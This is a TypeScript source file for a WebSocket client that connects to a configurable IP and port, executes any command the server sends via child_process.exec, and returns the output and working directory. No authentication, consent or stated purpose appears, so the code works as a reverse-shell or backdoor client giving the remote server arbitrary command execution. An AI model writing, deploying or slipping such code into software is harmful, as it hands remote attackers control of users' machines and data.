import { WebSocket } from "ws";
import { exec, ExecException, spawn } from "child_process";
import path from "path";

export enum SocketAction
{
    Command,
    Message,
    CWDGetter
}

export class ClientSocket
{
    private socketPort:number;
    private socketClient:WebSocket;
    private ip:string;

    private cwd:string;

    private get socketServerAdress():string
    {
        return "ws://" + this.ip + ":" + this.socketPort;
    }

    public constructor(ip:string, socketPort:number)
    {
        this.ip = ip;
        this.socketPort = socketPort;
        this.socketClient = new WebSocket(this.socketServerAdress);

        this.cwd = process.cwd();

        this.socketClient.on("message", function(this:ClientSocket, message:string)
        {
            console.log("[x] Received : " + message);
            let parsedMessage = JSON.parse(message);
            if(parsedMessage.socketAction == SocketAction.Command)
            {
                if(parsedMessage.command.includes("cd")) this.cwd = path.join(this.cwd, parsedMessage.command.substring(3));

                exec(parsedMessage.command, {cwd:this.cwd}, function(this:ClientSocket, error: ExecException | null, stdout: string, stderr: string)
                {
                    if(error)
                    {
                        this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout:stderr, closed:true}));
                        return;
                    }
                    this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout, closed:true}));
                }.bind(this));
                // child.stdout.on('data', function(this:ClientSocket, stdout:string)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout, closed:false}));
                // }.bind(this));
                // child.stderr.on('data', function(this:ClientSocket, stderr:string)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout:stderr, closed:false}));
                // }.bind(this));
                // child.on('close', function(this:ClientSocket, code:number)
                // {
                //     this.socketClient.send(JSON.stringify({cwd:this.cwd, stdout:"", closed:true}));
                // }.bind(this));
            }

            if(parsedMessage.socketAction == SocketAction.Message)
            {
                // alert(parsedMessage.message);
                // dialog.showMessageBox({message:parsedMessage.message});
            }

            if(parsedMessage.socketAction == SocketAction.CWDGetter)
            {
                // alert(parsedMessage.message);
                // dialog.showMessageBox({message:parsedMessage.message});
                this.socketClient.send(JSON.stringify({cwd:this.cwd}));
            }
        }.bind(this));
    }
}